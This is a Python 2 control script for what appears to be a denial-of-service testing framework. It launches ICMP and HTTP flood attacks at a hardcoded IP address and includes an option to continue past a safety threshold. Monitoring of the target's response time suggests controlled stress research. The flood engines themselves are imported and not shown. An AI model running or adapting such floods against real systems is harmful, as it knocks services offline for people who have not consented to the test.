# Master (Mon + attk)

import threading, time, Queue, random  # Python
import Xtcplistener, Mtcplistener, Ftcplistener, attack_master
import monitoring_master as monitoring_master     # Own classes

# Statics
ALL_THREADS = []
attack_q = Queue.Queue(maxsize=1) # Max number of outstanding instruction is 1
monitoring_q = Queue.Queue()
input_q = Queue.Queue()
attack_mon_q = Queue.Queue()

probe_queue_out = Queue.Queue()
probe_queue_in = Queue.Queue()
rate_q = Queue.Queue()
application_mon_q = Queue.Queue()
flag_q = Queue.Queue()
http_treshold_q_rep = Queue.Queue(maxsize=1)

# Hardcoded Target
TARGET = "145.100.104.173"
TARGET_PORT = 80

HTTP_TRESHOLD = 0.200 # 200ms HTTP timeout threshold


# Attack master
def start_attack_master():
    print "Starting attack master"

    # Attack TCP listener
    attack_listener = Xtcplistener.TCPserver(attack_q)
    ALL_THREADS.append(attack_listener)
    attack_listener.daemon = True
    attack_listener.start()
    print "Attack Listener running"

    # Attack engine
    attack_engine = attack_master.Attacks(attack_q, input_q, probe_queue_in, probe_queue_out, rate_q, application_mon_q, flag_q, http_treshold_q_rep)
    ALL_THREADS.append(attack_engine)
    attack_engine.daemon = True
    attack_engine.start()
    #attack_engine.join()
    print "Attack engine running\n"

# Monitoring master
def start_monitoring_master():
    print "Starting monitoring master"

    # Monitoring TCP listener
    monitoring_listener = Mtcplistener.TCPserver(monitoring_q)
    ALL_THREADS.append(monitoring_listener)
    monitoring_listener.daemon = True
    monitoring_listener.start()
    print "  Regular Monitoring listener running"

    # Flood Monitoring TCP listener
    floodmonitoring_listener = Ftcplistener.TCPserver(rate_q)
    ALL_THREADS.append(floodmonitoring_listener)
    floodmonitoring_listener.daemon = True
    floodmonitoring_listener.start()
    print "  Flood Monitoring listener running"

    # Monitoring engine
    monitoring_engine = monitoring_master.Monitoring(monitoring_q, attack_mon_q, probe_queue_in, probe_queue_out, application_mon_q, http_treshold_q_rep, HTTP_TRESHOLD)
    ALL_THREADS.append(monitoring_engine)
    monitoring_engine.daemon = True
    monitoring_engine.start()
    print "  Monitoring engine running\n"


if __name__ == '__main__':
    start_attack_master()
    start_monitoring_master()

    aid = random.randint(1,1000)

    # Test options:
    # Startrate upped to 20000 pps for faster testing purposes. Should be <10 (0 ideally) for new tests.
    input_cmd1 = {'id':aid, aid:{'attack':'ICMPFLOOD', 'startrate':20000, 'monrate':2000, 'target':TARGET, 'duration':1000, 'port':80, 'status':"OK", 'pktsize': 400}}
    input_cmd2 = {'id':aid, aid:{'attack':'ICMPFLOOD', 'startrate':20000, 'monrate':2000, 'target':TARGET, 'duration':1000, 'port':80, 'status':"STOP", 'pktsize': 400}}

    input_cmd3 = {'id':aid, aid:{'attack':'HTTPFLOOD', 'startrate':60, 'monrate':20, 'target':TARGET, 'duration':1000, 'port':80, 'status':"OK", 'pktsize': 400, 'get':'/mike.php', 'processes':4, 'connections':196}}
    input_cmd4 = {'id':aid, aid:{'attack':'HTTPFLOOD', 'startrate':60, 'monrate':20, 'target':TARGET, 'duration':1000, 'port':80, 'status':"STOP", 'pktsize': 400, 'get':'/mike.php', 'processes':4, 'connections':196}}

    options = {}
    options["1"] = {'command':input_cmd1, 'msg':"Start ICMPFLOOD @ 145.100.104.173"}
    options["2"] = {'command':input_cmd2, 'msg':"Stop ICMPFLOOD @ 145.100.104.173"}
    options["3"] = {'command':input_cmd3, 'msg':"Start HTTPFLOOD @ 145.100.104.173"}
    options["4"] = {'command':input_cmd4, 'msg':"Stop HTTPFLOOD @ 145.100.104.173"}

    options["continue"] = {'flag':'kill_it', 'msg':"Continue attack beyond threshold (DANGEROUS)"}
    options["decrease"] = {'flag':'decrease', 'msg':"Decrease the attack rate (reset)"}
    options["manual"] = {'flag':'manual', 'msg':"Manual control of attack rate increments"}


    print "Pick either of the following options: "
    for K in options:
        if K not in ['continue', 'decrease', 'manual']:
            print "- [", K, "] ", options[K]['msg']

    while True:
        cmd = raw_input("CMD: ")
        if cmd not in ['continue', 'decrease', 'manual']:
            input_command = options[cmd]['command']
        else:
            # These are not new commands but rather flags to set if the threshold is reached.
            flag_q.put(options[cmd]['flag'])
            print "Limit handler"

        print "Exec command."
        input_q.put(input_command) # Sent
